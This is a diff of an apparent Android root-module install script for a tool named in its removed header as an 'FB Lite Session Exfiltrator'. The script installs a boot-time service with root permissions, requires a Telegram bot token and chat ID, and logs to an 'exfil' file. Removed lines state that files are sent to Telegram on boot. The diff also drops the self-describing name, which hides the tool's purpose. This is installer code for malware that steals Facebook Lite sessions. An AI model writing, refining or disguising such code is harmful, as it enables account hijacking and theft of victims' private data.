@@ -1,28 +1,34 @@
 #!/system/bin/sh
 
-# FB Lite Session Exfiltrator - Custom Install Script
-
 MODPATH=${0%/*}
 
 # Source config
-. $MODPATH/config.sh
+[ -f "$MODPATH/config.sh" ] && . "$MODPATH/config.sh"
 
 print_modname
 
-# Validate configuration
-if [ "$BOT_TOKEN" = "YOUR_BOT_TOKEN_HERE" ] || [ "$CHAT_ID" = "YOUR_CHAT_ID_HERE" ]; then
-  ui_print "⚠️  WARNING: You did not configure BOT_TOKEN and CHAT_ID!"
-  ui_print "   Edit config.sh and reflash, or the module won't work."
+# Extract common files
+ui_print "- Extracting module files..."
+unzip -o "$ZIPFILE" 'common/*' -d "$MODPATH" >&2
+
+# Set permissions
+set_perm_recursive "$MODPATH" 0 0 0755 0644
+set_perm "$MODPATH/common/service.sh" 0 0 0755
+set_perm "$MODPATH/customize.sh" 0 0 0755
+
+# Telegram config check
+if [ "$BOT_TOKEN" = "YOUR_BOT_TOKEN_HERE" ] || [ -z "$BOT_TOKEN" ]; then
+  ui_print ""
+  ui_print " ⚠ WARNING: BOT_TOKEN not configured!"
+  ui_print " Edit config.sh and reinstall the module"
+  ui_print ""
 fi
 
-# Extract common files
-ui_print "- Extracting module files"
-unzip -o "$ZIPFILE" 'common/*' -d $MODPATH >&2
+if [ "$CHAT_ID" = "YOUR_CHAT_ID_HERE" ] || [ -z "$CHAT_ID" ]; then
+  ui_print " ⚠ WARNING: CHAT_ID not configured!"
+  ui_print " Edit config.sh and reinstall the module"
+  ui_print ""
+fi
 
-# Set execute permissions
-set_perm_recursive $MODPATH 0 0 0755 0644
-set_perm $MODPATH/common/service.sh 0 0 0755
-set_perm $MODPATH/common/post-fs-data.sh 0 0 0755
-
-ui_print "- Installation complete"
-ui_print "- Files will be sent to Telegram on boot"
+ui_print " ✓ Installation complete!"
+ui_print " Monitor log: /data/local/tmp/fblite_exfil.log"
